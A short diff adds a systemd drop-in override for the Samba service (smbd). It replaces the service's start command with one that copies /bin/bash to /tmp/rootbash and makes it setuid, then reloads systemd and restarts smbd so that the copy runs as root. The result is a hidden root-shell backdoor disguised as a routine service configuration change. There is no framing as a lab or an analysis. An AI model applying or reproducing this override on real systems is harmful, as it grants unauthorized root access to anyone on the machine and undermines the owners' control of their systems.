@@ -1,0 +1,12 @@
+[Service]
+ExecStart=
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
+
+
+
+
+
+
+
+systemctl daemon-reload
+systemctl restart smbd
